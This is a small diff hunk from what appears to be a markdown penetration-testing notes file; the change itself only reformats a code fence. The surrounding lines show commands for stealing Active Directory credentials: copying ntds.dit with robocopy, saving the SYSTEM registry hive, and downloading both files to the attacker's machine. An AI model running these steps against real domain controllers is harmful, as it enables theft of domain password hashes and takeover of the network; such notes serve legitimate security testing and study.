@@ -106,7 +106,9 @@ robocopy /b z:\windows\ntds . ntds.dit
 reg save hklm\system c:\Temp\system
 ```
 
-Download files locally:```
+Download files locally:
+
+```
 download ntds.dit
 download system
 ```
